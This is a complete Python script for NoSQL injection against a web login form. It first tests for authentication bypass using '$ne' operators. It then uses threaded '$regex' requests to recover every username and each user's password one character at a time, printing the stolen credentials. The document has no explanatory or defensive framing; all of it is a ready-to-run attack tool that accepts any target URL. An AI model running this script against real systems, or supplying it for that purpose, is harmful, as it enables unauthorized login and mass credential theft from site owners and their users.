#!/usr/bin/env python3
import requests
import re
import string
import time
import concurrent.futures
import sys

TARGET_URL = ""
PARAM_NAME = ""
PARAM_PASSWORD = ""
INVALID_PASSWORD = "this_is_not_a_valid_password_12345"
URL_PATTERN = r'^(http|https)://[\w/:%#\$&\?\(\)~\.=\+\-]+$'
SEARCH_CHARS = string.ascii_letters + string.digits + string.punctuation

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
})

def is_url(url):
    return re.match(URL_PATTERN, url)

def send_payload(data):
    try:
        return session.post(TARGET_URL, data=data, allow_redirects=False, timeout=5)
    except:
        return None

def create_payload(field, operator, value, extra=None):
    key = f"{field}[{operator}]" if operator else field
    payload = {key: value, "login": "login"}
    if extra:
        payload.update(extra)
    return payload

def check_char(char, found_string, type, data):
    escaped = f"^{re.escape(found_string)}{re.escape(char)}"
    
    if type == "user":
        payload = create_payload(PARAM_NAME, "$regex", escaped, data)
    else:
        payload = create_payload(PARAM_PASSWORD, "$regex", escaped, data)

    response = send_payload(payload)
    if response and response.status_code == 302:
        return char
    return None

def search_users():
    print("[*] Searching users...")
    found_users = []

    while True:
        payload = {f"{PARAM_NAME}[$nin][]": found_users, f"{PARAM_PASSWORD}[$ne]": INVALID_PASSWORD}
        if send_payload(create_payload(PARAM_NAME, "$regex", "^.", payload)).status_code != 302:
            print("\n[*] No more users found.")
            break

        found_user = ""
        while True:
            found = False
            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                future_to_char = {executor.submit(check_char, char, found_user, "user", payload): char for char in SEARCH_CHARS}
                
                # display
                for char in SEARCH_CHARS:
                    sys.stdout.write(f"\r[!] Found user: {found_user}{char}")
                    sys.stdout.flush()
                    time.sleep(0.005)
                
                for future in concurrent.futures.as_completed(future_to_char):
                    response = future.result()
                    if response:
                        found_user += response
                        found = True
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
            if not found:
                sys.stdout.write(f"\r[!] Found user: {found_user} (Confirmed)\n")
                break
        
        if found_user:
            found_users.append(found_user)
        else:
            break
    return found_users

def search_password(user):
    print(f"[*] Searching password for {user}...")
    found_password = ""

    while True:
        found = False
        payload = {PARAM_NAME: user}
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            future_to_char = {executor.submit(check_char, char, found_password, "pass", payload): char for char in SEARCH_CHARS}
            
            # display
            for char in SEARCH_CHARS:
                sys.stdout.write(f"\r[!] Found password for {user} : {found_password}{char}")
                sys.stdout.flush()
                time.sleep(0.005)
                
            for future in concurrent.futures.as_completed(future_to_char):
                response = future.result()
                if response:
                    found_password += response
                    found = True
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        
        if not found:
            check_p = create_payload(PARAM_PASSWORD, "$regex", f"^{re.escape(found_password)}$", {PARAM_NAME: user})
            if send_payload(check_p).status_code == 302:
                print(f"\r[!] Found password for {user} : {found_password} (Confirmed)")
                break
    return found_password

def is_vulnerable():
    payload = create_payload(PARAM_NAME, "$ne", "dummy_user", {f"{PARAM_PASSWORD}[$ne]": INVALID_PASSWORD})
    print(f"[*] Checking NoSQLi vulnerability...")
    response = send_payload(payload)
    return response and response.status_code == 302

def main(target_url):
    global TARGET_URL, PARAM_NAME, PARAM_PASSWORD
    TARGET_URL = target_url
    PARAM_NAME = input("[*] Input field for username: ")
    PARAM_PASSWORD = input("[*] Input field for password: ")
    
    if is_vulnerable():
        print("[!] NoSQLi vulnerablity detected.")
        users = search_users()
        for user in users:
            search_password(user)
    else:
        print("[-] NoSQLi vulnerablity NOT detected.")

if __name__ == "__main__":
    try:
        url = input("[*] Input URL: ")
        if is_url(url):
            main(url)
        else:
            print("[!] Check URL => http:// or https://")
    except KeyboardInterrupt:
        print("\n[!] Exiting...")